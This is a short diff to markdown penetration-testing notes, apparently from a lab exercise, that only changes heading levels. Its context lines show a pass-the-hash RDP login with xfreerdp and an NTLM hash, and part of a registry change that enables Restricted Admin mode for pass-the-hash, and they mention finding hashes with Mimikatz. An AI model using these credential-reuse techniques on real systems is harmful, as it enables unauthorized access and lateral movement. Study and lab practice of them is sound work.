@@ -1,4 +1,4 @@
-### PTH using RDP:
+#### PTH using RDP:
 
 ```bash
 xfreerdp /v:10.129.25.120 /u:administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
@@ -14,7 +14,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 Then PTH for RDP should work
 
-### Mimikatz:
+#### Mimikatz:
 
 Find hashes:
 
